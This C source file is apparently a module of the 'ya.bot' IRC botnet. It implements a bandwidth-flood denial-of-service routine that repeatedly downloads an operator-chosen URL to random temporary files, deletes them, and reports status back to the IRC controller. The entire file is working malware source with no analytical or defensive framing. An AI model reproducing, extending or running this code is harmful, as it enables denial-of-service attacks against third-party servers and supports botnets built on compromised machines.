/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_BANDWITHFLOOD
DWORD WINAPI bandwithflood_main(LPVOID param)
{
	char szFilePath[MAX_PATH];
	int i;
	SBandwithFlood s_bf = *((SBandwithFlood *)param);
	
#ifndef NO_DEBUG
		debug_print("Bandwith flooding, bandwithflood_main()");
#endif

	if (!s_bf.m_bSilent)
			irc_message(s_bf.m_bsock, s_bf.m_szAction, s_bf.m_szDestination,
					(char *)string_ddosbandwithfloodstarted,
					CGREEN, string_replyddos, CEND, string_replydotbot,
					CBLUE, CEND, s_bf.m_szUrl,
					CBLUE, CEND, s_bf.m_nDelay,
					CBLUE, CEND, s_bf.m_nTimes);
	for (i = 0; i < s_bf.m_nTimes; i++)
	{
			srand(GetTickCount());
			_snprintf(szFilePath, sizeof(szFilePath) - 1,
					string_ddosbandwithfloodfilename,
					rand() % 9999);
			xURLDownloadToFile(s_bf.m_szUrl, szFilePath);
			Sleep(s_bf.m_nDelay);
			file_delete(szFilePath);
	}
	if ((!s_bf.m_bSilent) && (s_bf.m_bVerbose))
			irc_message(s_bf.m_bsock, s_bf.m_szAction, s_bf.m_szDestination,
					(char *)string_ddosfinishedflooding,
					CBLUE, string_replyddos, CEND, string_replydotbot,
					CBLUE, CEND, s_bf.m_szUrl,
					CBLUE, CEND, s_bf.m_nTimes);
		thread_remove(THREAD_DDOS);
		return 0;
}
#endif